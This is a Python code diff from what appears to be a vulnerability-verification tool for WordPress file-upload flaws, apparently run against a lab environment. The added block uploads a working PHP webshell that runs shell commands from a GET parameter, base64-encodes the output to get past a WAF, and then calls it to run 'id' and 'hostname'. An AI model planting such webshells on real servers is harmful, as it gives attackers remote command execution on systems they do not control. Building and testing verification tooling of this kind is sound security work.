@@ -11680,6 +11680,55 @@ def verify_wordpress_file_upload(
                     boot.capture(boot.sub_sess, rel,
                            f"Paso 5b: FILE UPLOAD (navegador) — webshell ejecuta {expected}={a}+{b}.",
                            f"Step 5b: FILE UPLOAD (browser) — webshell executes {expected}={a}+{b}.")
+                    # Post-execution: upload a real webshell and run id/uname via HTTP
+                    try:
+                        _ws_token = _token()
+                        _ws_fname = f"binoracle_{_ws_token}.php"
+                        # PHP webshell: echo marker + system(cmd) + base64-encode to avoid WAF
+                        _ws_php = (
+                            b"<?php if(isset($_GET['_cmd'])){"
+                            b"echo 'WS_OUT:'.base64_encode(shell_exec($_GET['_cmd'])).'WS_END';"
+                            b"}else{echo 'WS:1';}?>"
+                        )
+                        _ws_extra = {
+                            _subst(k, _ws_fname): _subst(v, _ws_fname)
+                            if isinstance(v, str) else v
+                            for k, v in _extra_upload_resolved.items()
+                        }
+                        _sess_to_use.request(
+                            m, boot.base_url + endpoint,
+                            data={**other_params, **_ws_extra},
+                            files={_actual_file_field: (_ws_fname, _ws_php, "application/x-php")},
+                            timeout=20)
+                        _ws_path = lab.find_in_webroot(_ws_token)
+                        if _ws_path:
+                            _ws_rel = _ws_path.replace("/var/www/html", "", 1)
+                            _ws_url = boot.base_url + _ws_rel
+                            import requests as _rqs2
+                            _id_r = _rqs2.get(_ws_url + "?_cmd=id", timeout=8)
+                            _uname_r = _rqs2.get(_ws_url + "?_cmd=hostname", timeout=8)
+                            _id_body = _id_r.text or ""
+                            _uname_body = _uname_r.text or ""
+                            import base64 as _b64
+                            def _decode_ws(raw: str) -> str:
+                                m2 = re.search(r"WS_OUT:([A-Za-z0-9+/=]+)WS_END", raw)
+                                if m2:
+                                    try:
+                                        return _b64.b64decode(m2.group(1)).decode("utf-8", errors="replace").strip()
+                                    except Exception:
+                                        return ""
+                                return ""
+                            _id_out = _decode_ws(_id_body)
+                            _host_out = _decode_ws(_uname_body)
+                            if _id_out or _host_out:
+                                res.evidence["webshell_exec"] = {
+                                    "url": _ws_url,
+                                    "id_output": _id_out,
+                                    "hostname": _host_out,
+                                }
+                                step(f"webshell POST-EXEC: id={_id_out!r}, hostname={_host_out!r}")
+                    except Exception:
+                        pass
                     break
             if found:
                 break
